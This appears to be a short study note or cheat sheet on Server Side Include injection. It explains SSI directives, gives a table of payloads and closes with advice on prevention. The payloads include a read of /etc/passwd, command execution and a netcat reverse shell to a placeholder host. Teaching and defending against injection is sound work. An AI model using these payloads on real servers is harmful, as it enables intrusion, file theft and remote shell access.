SSI Injection occurs when an attacker can input Server Side Include directives into a web application. SSIs are directives that can include files, execute commands, or print environment variables/attributes. If user input is not properly sanitized within an SSI context, this input can be used to manipulate server-side behavior and access sensitive information or execute commands.

SSI format: `<!--#directive param="value" -->`

 Payloads:
https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Include%20Injection/#methodology

| Description             | Payload                                             |                                    |
| ----------------------- | --------------------------------------------------- | ---------------------------------- |
| Print the date          | `<!--#echo var="DATE_LOCAL" -->`                    |                                    |
| Print the document name | `<!--#echo var="DOCUMENT_NAME" -->`                 |                                    |
| Print all the variables | `<!--#printenv -->`                                 |                                    |
| Setting variables       | `<!--#set var="name" value="Rich" -->`              |                                    |
| Include a file          | `<!--#include file="/etc/passwd" -->`               |                                    |
| Include a file          | `<!--#include virtual="/index.html" -->`            |                                    |
| Execute commands        | `<!--#exec cmd="ls" -->`                            |                                    |
| Reverse shell           | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\\ | /bin/bash 1>/tmp/f;rm /tmp/f" -->` |

## Prevention
As with any injection vulnerability, developers must carefully validate and sanitize user input to prevent SSI injection.

configure the webserver to restrict the use of SSI to particular file extensions and potentially even particular directories. On top of that, the capabilities of specific SSI directives can be limited to help mitigate the impact of SSI injection vulnerabilities. For instance, it might be possible to turn off the `exec` directive if it is not actively required.
